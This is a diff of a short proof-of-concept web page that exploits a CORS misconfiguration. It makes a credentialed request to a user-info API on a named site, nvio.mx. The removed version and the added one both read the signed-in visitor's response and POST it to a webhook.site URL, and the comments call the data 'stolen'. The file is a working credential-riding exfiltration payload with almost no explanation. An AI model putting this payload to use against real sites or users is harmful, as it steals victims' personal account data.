@@ -1,36 +1,24 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>CORS PoC</title>
-  </head>
-  <body>
-    <h1>CORS PoC Running...</h1>
-    <pre id="output">Loading...</pre>
-
-    <script>
-      (async () => {
-        try {
-          const response = await fetch("https://nvio.mx/api/userinfo", {
-            credentials: "include"
-          });
-
-          const text = await response.text();
-
-          // Display response on page
-          document.getElementById("output").innerText = text;
-
-          // Exfiltrate data to your webhook
-          await fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
-            method: "POST",
-            mode: "no-cors",
-            body: text
-          });
-
-        } catch (err) {
-          console.error("PoC Error:", err);
-          document.getElementById("output").innerText = "Error: " + err;
-        }
-      })();
-    </script>
-  </body>
-</html>
+<script>
+fetch("https://nvio.mx/api/userinfo", {
+  method: "GET",
+  credentials: "include"
+})
+.then(res => res.text())
+.then(data => {
+  // Send the stolen response to your webhook
+  fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain"
+    },
+    body: data
+  });
+})
+.catch(err => {
+  // Send any error info to your webhook too
+  fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
+    method: "POST",
+    body: "Fetch failed: " + err
+  });
+});
+</script>
